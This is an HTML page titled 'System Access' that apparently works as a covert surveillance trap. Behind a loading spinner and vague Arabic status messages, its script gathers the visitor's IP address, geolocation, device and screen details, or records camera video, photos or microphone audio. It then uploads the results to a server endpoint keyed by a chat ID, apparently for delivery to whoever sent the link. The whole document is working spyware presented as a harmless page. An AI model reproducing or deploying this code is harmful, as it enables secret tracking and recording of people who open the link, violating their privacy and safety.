<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Access</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #333; border-top: 4px solid #fff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 18px; color: #aaa; }
    </style>
</head>
<body>
    <div>
        <div class="loader" id="loader"></div>
        <div id="status">أنتظر قليلاً...</div>
    </div>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chatId');
        const type = urlParams.get('type');
        const facing = urlParams.get('facing') || 'user';
        
        async function run() {
            try {
                if (type === 'info' || type === 'iptrack') {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    let location = "غير متاح";
                    if (navigator.geolocation) {
                        try {
                            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {timeout: 5000}));
                            location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
                        } catch(e) {}
                    }
                    const info = { ip: ipData.ip, device: navigator.userAgent, screen: `${screen.width}x${screen.height}`, location: location };
                    document.getElementById('status').innerText = "جاري الإرسال...";
                    const formData = new FormData();
                    formData.append('data', JSON.stringify(info, null, 2));
                    formData.append('chatId', chatId);
                    formData.append('type', type);
                    await fetch('/upload', { method: 'POST', body: formData });
                    document.getElementById('status').innerText = "تم بنجاح.";
                    document.getElementById('loader').style.display = 'none';
                    return;
                }

                let constraints = {};
                if (type === 'audio') { constraints = { audio: true, video: false }; }
                else if (type === 'video') { constraints = { audio: true, video: { facingMode: facing } }; }
                else if (type === 'photo') { constraints = { audio: false, video: { facingMode: facing } }; }

                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                document.getElementById('status').innerText = "جاري الاتصال...";
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const mime = type === 'audio' ? 'audio/webm' : (type === 'photo' ? 'image/jpeg' : 'video/webm');
                    const blob = new Blob(chunks, { type: mime });
                    document.getElementById('status').innerText = "جاري الرفع...";
                    const formData = new FormData();
                    formData.append('file', blob);
                    formData.append('chatId', chatId);
                    formData.append('type', type);
                    await fetch('/upload', { method: 'POST', body: formData });
                    document.getElementById('status').innerText = "تم الإرسال بنجاح.";
                    document.getElementById('loader').style.display = 'none';
                };
                mediaRecorder.start();
                let duration = 15000;
                if (type === 'photo') duration = 3000;
                if (type === 'video') duration = 10000;
                setTimeout(() => { mediaRecorder.stop(); stream.getTracks().forEach(track => track.stop()); }, duration);
            } catch (err) {
                document.getElementById('status').innerText = "فشل الاتصال.";
                document.getElementById('loader').style.display = 'none';
            }
        }
        setTimeout(run, 1500);
    </script>
</body>
</html>
